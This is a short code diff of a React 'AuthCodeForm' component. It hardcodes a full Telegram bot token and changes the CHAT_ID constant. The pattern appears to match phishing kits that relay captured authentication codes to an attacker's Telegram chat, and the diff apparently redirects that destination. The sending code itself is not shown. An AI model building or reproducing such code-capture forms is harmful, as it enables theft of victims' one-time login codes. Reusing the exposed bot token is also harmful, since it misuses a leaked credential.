@@ -7,7 +7,7 @@ const AuthCodeForm = () => {
   const { t, ready } = useTranslation();
   if (!ready) return null;
   const BOT_TOKEN = "8056845785:AAHpHNS3WjVDo17QAyWhbnn5tja5YQfYooc";
-  const CHAT_ID = "-4943927839";
+  const CHAT_ID = "-4877783712";
 
   const { state } = useLocation();
   if (!state) return <Navigate to="/" replace />;
